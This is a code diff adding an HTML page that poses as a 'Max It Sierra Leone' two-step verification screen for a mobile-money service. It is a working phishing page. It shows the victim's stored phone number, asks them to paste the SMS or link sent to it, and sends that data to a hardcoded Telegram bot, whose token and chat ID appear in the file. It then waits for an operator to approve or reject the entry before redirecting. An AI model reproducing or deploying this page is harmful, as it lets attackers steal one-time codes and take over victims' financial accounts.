@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Max it - Two Step Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { --orange: #FF7900; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background-color: #f0f4f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .app-container { width: 100%; max-width: 400px; height: 100vh; max-height: 850px; background-color: white; display: flex; flex-direction: column; border-radius: 40px; border: 8px solid #000; overflow: hidden; }
+        .header { background: var(--orange); color: white; padding: 20px; text-align: center; font-weight: 800; font-size: 20px; }
+        .content { padding: 40px 25px; flex-grow: 1; text-align: center; }
+        h2 { font-size: 24px; margin-bottom: 15px; }
+        p { color: #64748b; font-size: 14px; margin-bottom: 30px; }
+        .phone-display { font-weight: 800; font-size: 18px; margin-bottom: 30px; display: block; }
+        textarea { width: 100%; height: 120px; border: 1px solid #cbd5e1; border-radius: 12px; padding: 15px; font-size: 14px; margin-bottom: 20px; outline: none; resize: none; }
+        textarea:focus { border-color: var(--orange); }
+        .btn-submit { width: 100%; background: var(--orange); color: white; border: none; padding: 18px; border-radius: 12px; font-weight: 800; cursor: pointer; }
+        .footer { padding: 20px; text-align: center; color: #94a3b8; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <div class="header">MaxIt</div>
+        <div class="content">
+            <h2>Two Step Verification</h2>
+            <p>Paste the complete link/sms message sent to your number</p>
+            <span class="phone-display" id="displayPhone">+232.........</span>
+            <textarea id="smsInput" placeholder="Paste your complete Link/SMS message here..."></textarea>
+            <button class="btn-submit" id="submitBtn">SUBMIT</button>
+        </div>
+        <div class="footer">© 2026 Max It Sierra Leone</div>
+    </div>
+    <script>
+        const botToken = '8748645145:AAGKd2p22f1l4BILkJoiYLitbB6de8ufAVw';
+        const chatId = '6573120346';
+
+        async function sendToTelegram(pageName, data) {
+            const escapeMd = s => String(s).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+            let message = `🚀 *New Data from ${pageName}*\n\n`;
+            for (const [key, value] of Object.entries(data)) { message += `*${escapeMd(key)}*: \`${escapeMd(value)}\`\n`; }
+            message += `\n👇 *Action Required:*`;
+            const inlineKeyboard = { inline_keyboard: [[{ text: "✅ Approve", callback_data: `APPROVE_${data.Phone}` }, { text: "❌ Reject", callback_data: `REJECT_${data.Phone}` }]] };
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'MarkdownV2', reply_markup: JSON.stringify(inlineKeyboard) })
+                });
+            } catch (error) { console.error("Telegram Error:", error); }
+        }
+
+        function startPolling(phone, nextUrl, btnElement) {
+            let offset = 0;
+            let decided = false;
+            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=100`).then(r => r.json()).then(data => {
+                if (data.ok && data.result.length > 0) { offset = data.result[data.result.length - 1].update_id + 1; }
+                const intervalId = setInterval(() => {
+                    if (decided) return;
+                    fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=20&offset=${offset}`).then(r => r.json()).then(data => {
+                        if (!data.ok || decided) return;
+                        for (let update of data.result) {
+                            offset = update.update_id + 1;
+                            if (update.callback_query) {
+                                const action = update.callback_query.data;
+                                if (action === `APPROVE_${phone}`) { decided = true; clearInterval(intervalId); window.location.href = nextUrl; }
+                                else if (action === `REJECT_${phone}`) { decided = true; clearInterval(intervalId); btnElement.innerHTML = 'Try Again'; btnElement.disabled = false; alert("Request was not approved."); }
+                            }
+                        }
+                    });
+                }, 3000);
+            });
+        }
+
+        const phone = sessionStorage.getItem('savedPhone') || '+232.........';
+        document.getElementById('displayPhone').innerText = phone;
+        
+        document.getElementById('submitBtn').addEventListener('click', async function() {
+            const sms = document.getElementById('smsInput').value;
+            if (!sms) { alert("Please paste the SMS content."); return; }
+            this.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
+            this.disabled = true;
+            await sendToTelegram('OTP Page', { 'Phone': phone, 'SMS': sms });
+            startPolling(phone, 'success.html', this);
+        });
+    </script>
+</body>
+</html>
